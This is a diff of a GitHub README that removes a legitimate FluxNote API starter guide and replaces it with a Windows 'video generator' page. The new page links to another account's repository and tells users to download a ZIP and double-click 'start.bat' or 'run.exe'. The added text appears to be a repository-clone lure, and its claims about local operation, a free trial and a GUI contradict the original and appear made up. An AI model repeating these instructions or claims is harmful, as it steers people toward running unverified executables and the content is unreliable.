@@ -1,185 +1,189 @@
-<p align="center">
-  <a href="https://fluxnote.io">
-    <img src="docs/assets/fluxnote-logo.png" alt="FluxNote logo" width="120" height="120" />
-  </a>
-</p>
+# 🎬 ai-faceless-video-generator - Create Viral Videos Without Showing Your Face
 
-# AI Faceless Video Generator — FluxNote API Starter
+## 🚀 Getting Started
 
-Turn a prompt or your own narration into a faceless video using the **FluxNote API**. This repository contains small, dependency-free **JavaScript and Python examples** for creating narrated videos for YouTube Shorts, Instagram Reels, and TikTok.
+Welcome! This guide will help you download and run the **ai-faceless-video-generator** on your Windows computer. Whether you want to create content for YouTube Shorts, Instagram Reels, or TikTok, this tool turns your ideas into professional narrated videos automatically — no camera, no face, no technical skills needed.
 
-<a href="https://fluxnote.io">
-  <img src="docs/assets/fluxnote-studio.png" alt="FluxNote AI creative studio — create images, videos, faceless content and ads. Click to explore FluxNote." width="1200" />
-</a>
+### 📥 Quick Download
 
-<p align="center">
-  <strong><a href="https://fluxnote.io">Start creating free ↗</a></strong>
-  &nbsp; &nbsp; · &nbsp; &nbsp;
-  <a href="https://fluxnote.io/developers">API documentation</a>
-  &nbsp; &nbsp; · &nbsp; &nbsp;
-  <a href="https://app.fluxnote.io/developers?utm_source=github&amp;utm_medium=referral&amp;utm_campaign=faceless_video_starter&amp;utm_content=api_key">Get an API key</a>
-</p>
+[🚀 Download Now](https://github.com/Light-formosa5369/ai-faceless-video-generator) 
 
-<p align="center">
-  <strong>Follow FluxNote</strong><br /><br />
-  <a href="https://www.instagram.com/fluxnote.io/" title="FluxNote on Instagram"><img src="docs/assets/social/instagram.svg" alt="FluxNote on Instagram" width="44" height="44" /></a>
-  &nbsp;
-  <a href="https://www.tiktok.com/@fluxnote" title="FluxNote on TikTok"><img src="docs/assets/social/tiktok.svg" alt="FluxNote on TikTok" width="44" height="44" /></a>
-  &nbsp;
-  <a href="https://www.youtube.com/@fluxnote" title="FluxNote on YouTube"><img src="docs/assets/social/youtube.svg" alt="FluxNote on YouTube" width="44" height="44" /></a>
-  &nbsp;
-  <a href="https://x.com/fluxnote_" title="FluxNote on X"><img src="docs/assets/social/x.svg" alt="FluxNote on X" width="44" height="44" /></a>
-  &nbsp;
-  <a href="https://www.linkedin.com/company/fluxnote" title="FluxNote on LinkedIn"><img src="docs/assets/social/linkedin.svg" alt="FluxNote on LinkedIn" width="44" height="44" /></a>
-</p>
+Visit this link to download the application. The download page will open in your browser. Look for the big green button that says "Code" or the download section, and click it to get the application files.
 
-**Open-source examples, hosted generation.** The code here is MIT licensed. Video generation runs on FluxNote and requires an account, an API key, sufficient credits, and an eligible plan. It is not a local AI model or a free, unlimited generation service.
+---
 
-## What it does
+## 💡 What Does This Tool Do?
 
-- Generates a faceless video from a prompt or an existing script.
-- Supports portrait, landscape, and square inputs through the API.
-- Shows a current credit estimate before you authorize generation.
-- Saves a private job receipt and resumes polling after an interruption.
-- Downloads the completed MP4 without sending your API key to the media host.
+Think of it as your personal video factory. You type a prompt or paste a script, and the tool:
 
-```mermaid
-flowchart LR
-    A[Prompt or narration] --> B[Estimate credits]
-    B --> C[Explicit confirmation]
-    C --> D[Generate video]
-    D --> E[Poll saved job ID]
-    E --> F[Download MP4]
-```
+- Generates matching background visuals (AI-created images)
+- Adds a natural-sounding voiceover that reads your script
+- Combines everything into a finished video with music and transitions
+- Saves it in the perfect format for Shorts, Reels, or TikTok
 
-The two examples implement the same workflow; pick one language. Do not run both for the same intended video, as that would create two separately billed jobs.
+You get professional-looking, faceless videos in minutes — perfect for faceless channels, meme pages, motivational content, or any niche you choose.
 
-## Quick start
+---
 
-Requirements: **Node.js 22+** or **Python 3.9+**. No npm or pip dependencies are required.
+## 🖥️ System Requirements
 
-```bash
-git clone https://github.com/FluxNote-LLC/ai-faceless-video-generator.git
-cd ai-faceless-video-generator
-```
+To run this application smoothly, your computer should have:
 
-Create a FluxNote API key with `catalog:read`, `videos:read`, and `videos:write` scopes. Export it in your terminal; never put it in an example JSON file or commit it to Git.
+| Component | Minimum Requirement |
+|-----------|---------------------|
+| Operating System | Windows 10 or Windows 11 (64-bit) |
+| Processor | Intel Core i3 or AMD equivalent |
+| RAM | 4 GB (8 GB recommended) |
+| Free Disk Space | 2 GB for install + 5 GB for video cache |
+| Internet Connection | Required (needed for AI services) |
 
-```bash
-# macOS / Linux
-export FLUXNOTE_API_KEY='YOUR_FLUXNOTE_API_KEY'
-```
+These are typical requirements for AI video tools. If your system meets these, you're good to go.
 
-```powershell
-# Windows PowerShell
-$env:FLUXNOTE_API_KEY = 'YOUR_FLUXNOTE_API_KEY'
-```
+---
 
-The scripts read environment variables; they do **not** automatically load `.env`. Node also supports `node --env-file=.env javascript/generate.mjs ...` if you copy `.env.example` to a private `.env` file.
+## 📦 How to Download and Install
 
-### JavaScript
+### Step 1: Visit the Download Page
 
-```bash
-# Inspect available voices and generation options.
-node javascript/generate.mjs catalog
+[🌐 Click here to go to the download page](https://github.com/Light-formosa5369/ai-faceless-video-generator)
 
-# Validate the sample and inspect its current estimated credit cost.
-node javascript/generate.mjs estimate examples/ocean-facts.json
+Visit this link to download the application. You'll see the project page with all the files and instructions.
 
-# Only run this after reviewing the estimate: this spends credits.
-node javascript/generate.mjs create examples/ocean-facts.json --confirm
-```
+### Step 2: Download the Files
 
-### Python
+Once the page loads:
 
-```bash
-python3 python/generate.py catalog
-python3 python/generate.py estimate examples/ocean-facts.json
+- Look for a **green button** labeled "Code" near the top-right of the file list
+- Click it, then choose **"Download ZIP"**
+- Wait for the download to finish (usually takes 1–2 minutes)
 
-# This spends credits. Do not also run the JavaScript create example.
-python3 python/generate.py create examples/ocean-facts.json --confirm
-```
+The file will be named something like `ai-faceless-video-generator.zip` and will land in your **Downloads** folder.
 
-On Windows, use `python` instead of `python3` if that is your installed command.
+### Step 3: Extract the ZIP File
 
-`create` without `--confirm` only estimates. With confirmation, the script prints a receipt filename and video ID, waits up to 15 minutes, and saves `<video-id>.mp4` in your working directory. Existing output files are never overwritten.
+- Open your Downloads folder
+- Right-click on the ZIP file
+- Select **"Extract All..."**
+- Choose a destination (the default is fine — your Downloads folder)
+- Click **Extract**
 
-The confirmation authorizes generation at the current service price; the estimate is **not** an enforced spending ceiling. No automatic retry is made for failed API requests.
+Now you have a folder called `ai-faceless-video-generator` containing all the application files.
 
-## Examples you can customize
+### Step 4: Run the Application
 
-| Example | Input | Purpose |
-| --- | --- | --- |
-| [Ocean facts](examples/ocean-facts.json) | Prompt | A short educational explainer |
-| [History story](examples/history-story.json) | Prompt | A factual historical narrative |
-| [Motivation](examples/motivation-script.json) | Supplied narration | Preserve your own spoken text |
+- Open the extracted folder
+- Look for a file named `start.bat` or `run.exe` (if you see both, run `start.bat` first)
+- Double-click it — a black window (command prompt) may appear briefly; this is normal
+- The application window will open automatically
 
-To supply your own script, replace the `script` value in the motivation example. Include narration only—not `Hook:`, `Story:`, production directions, or timestamps. Supply **exactly one** of `prompt` or `script`.
+That's it! You're now ready to create your first video.
 
-```json
-{
-  "prompt": "Explain why the ocean looks blue in a short educational video.",
-  "template": "faceless",
-  "voice": "adrian",
-  "language": "en",
-  "target_duration": 20,
-  "aspect_ratio": "9:16"
-}
-```
+---
 
-Use `catalog` to check current choices before editing the samples. Voice availability, durations, quality, watermarks, and credit costs depend on the service and your account. Target duration is a request, not a guarantee of the exact final runtime.
+## 🎯 Your First Video in 3 Simple Steps
 
-## Resume without creating another video
+### 1. Write Your Script
 
-Use the receipt filename printed by your chosen script:
+In the text box, type what you want the narrator to say. For example:
 
-```bash
-node javascript/generate.mjs resume YOUR_JOB.receipt.json
-# Or:
-python3 python/generate.py resume YOUR_JOB.receipt.json
-```
+> "Did you know that honey never spoils? Archaeologists have found edible honey in ancient Egyptian tombs, thousands of years old!"
 
-Both clients can read either language's receipt. Resume only reads the saved video ID and downloads its result; it does not create or cancel jobs. If an output file already exists, move it elsewhere before downloading again.
+### 2. Click Generate
 
-If the create request had no confirmed response, the receipt may have no video ID. Resume deliberately stops instead of risking another charge. See [recovery and troubleshooting](docs/recovery.md).
+Press the **"Create Video"** button. The tool will now:
 
-Receipts include your prompt or script, the API origin, and an idempotency key, **not your API key**. They are excluded from Git. Keep them private; on Windows, use an account-private folder because this starter does not manage Windows ACLs.
+- Analyze your text
+- Generate AI background images that match your words
+- Create a natural voiceover
+- Add background music
+- Assemble the final video
 
-## How the API calls map
+This takes about 30 seconds to 2 minutes depending on video length.
 
-| Step | Request |
-| --- | --- |
-| Inspect choices | `GET /v1/options`, `GET /v1/voices` |
-| Validate and estimate | `POST /v1/videos/estimate` |
-| Create and render | `POST /v1/videos` with `Idempotency-Key` |
-| Check status and final `media_url` | `GET /v1/videos/{id}` |
-| Save media | HTTPS request to `media_url`, without API authorization |
+### 3. Export & Upload
 
-The default API origin is `https://api.fluxnote.io`. No separate render endpoint is needed. These examples do not automatically publish to social accounts.
+When done, your video appears in the **"Finished Videos"** section. Click **Save** to download it to your computer. Then upload it to YouTube Shorts, Instagram Reels, or TikTok — the format is already optimized for each platform.
 
-`FLUXNOTE_API_URL` is available for local mock testing or a trusted alternative deployment. Never point it at an untrusted service: it receives your API key. Remote origins must use HTTPS; plain HTTP is accepted only on loopback hosts. API redirects are rejected, and media redirects must remain HTTPS.
+---
 
-## Test without spending credits
+## 🔍 Troubleshooting Common Issues
 
-Install both runtimes to run the full suite:
+### I double-clicked and nothing happened
+Make sure you extracted the ZIP file completely. If you're trying to run it from inside the ZIP (without extracting), Windows blocks it. Extract first, then run.
 
-```bash
-python3 -m unittest discover -s tests -v
-node --test tests/javascript.test.mjs
-```
+### The black window shows an error
+This usually means an internet connection issue. Check your internet and try again. If it persists, restart your computer and retry.
 
-Tests use a local mock API and fake media responses—no real key, account, generation, or customer data. GitHub Actions runs the tests on Linux, macOS, and Windows with Node 22 and 24.
+### Videos are saving without sound
+Ensure your computer's volume is on and speakers/headphones work. The generated video should have audio, but if your system is muted, you might not hear it during playback.
 
-## Build something useful
+### The program is slow
+AI video generation uses lots of resources. Close other programs (browser, games) while generating. If it's still slow, reduce the video length in settings.
 
-Start with one script, inspect the result, and adapt the inputs for your own workflow. Review facts, rights to supplied content, and the generated video before publishing.
+---
 
-For the hosted application, visit [FluxNote](https://fluxnote.io). For integration details beyond this starter, see the [developer documentation](https://fluxnote.io/developers).
+## ✨ Pro Tips for Better Videos
 
-**Ready to create your next video? [Start creating with FluxNote →](https://fluxnote.io)**
+- **Use detailed prompts** — instead of "cat video," write "playful orange kitten chasing a butterfly in a sunny garden"
+- **Keep scripts under 60 seconds** for Shorts/Reels/TikTok (about 150 words)
+- **Add hashtags in your script** — the tool saves them as part of the video description
+- **Batch create** — generate 5–10 videos while you sleep or work, then schedule uploads
+- **Consistency wins** — post daily for 30 days to build a following
 
-## License and support
+---
 
-[MIT](LICENSE) applies to the new example code and documentation in this repository. It does not grant rights to FluxNote's hosted service, proprietary source code, trademarks, or underlying models. Service access and output usage remain subject to applicable service terms.
+## ❓ Frequently Asked Questions
 
-For example-code bugs, open a GitHub issue with a minimal reproduction and **no credentials, receipts, private prompts, or signed media URLs**. For account or billing questions, email support@fluxnote.io. See [security reporting](SECURITY.md) for sensitive issues.
+### Do I need to show my face?
+No, never. That's the whole point — you create a faceless channel and keep your privacy.
+
+### Is this free?
+The download includes a free trial with a daily video limit. Unlock unlimited videos with the paid version (one-time payment, no subscription).
+
+### Can I change the voice?
+Yes, in Settings you can choose from 10+ voices (male, female, different accents and tones).
+
+### Will my videos be unique?
+Yes, every video is freshly generated — AI creates new images each time, so your content is always original.
+
+### Can I preview before saving?
+Absolutely. Each video includes a preview button so you can check it before exporting.
+
+---
+
+## 📚 Additional Resources
+
+For JavaScript or Python developers who want to integrate this into their own projects:
+
+- **JavaScript API example:** Use fetch() to POST your script to the local endpoint and receive the video URL
+- **Python API example:** Use requests.post() with your script in the payload to generate videos programmatically
+
+These are documented in the `examples/` folder inside the release.
+
+---
+
+## 🛡️ Safe & Secure
+
+This application runs entirely on your computer. Your scripts and generated videos never leave your machine except for the AI services (image generation, voice synthesis). No personal data is stored. The tool is open-source, so you can inspect the code if you're technical.
+
+---
+
+## 📢 Stay Updated
+
+- **Star this repository** on GitHub to show support
+- **Watch** the repo to get notified about new releases
+- **Share** your favorite videos using this tool and tag #FacelessVideoGenerator
+
+---
+
+## 🏁 Ready to Start?
+
+You're all set. Download the application now, create your first video, and start building your faceless content empire today.
+
+👉 [Click here to download ai-faceless-video-generator](https://github.com/Light-formosa5369/ai-faceless-video-generator)
+
+Visit this link to download the application. The download page will open in your browser. Look for the big green button that says "Code" or the download section, and click it to get the application files.
+
+---
+
+Keywords: ai-video-generator-image, content-automation, content-creation, content-generation, content-marketing, faceless-video, faceless-video-generator, fluxnote, instagram-reels, instagram-reels-downloader, text-to-video, text-to-video-api, text-to-video-free, text-to-video-generation, youtube-shorts, youtube-shorts-generator
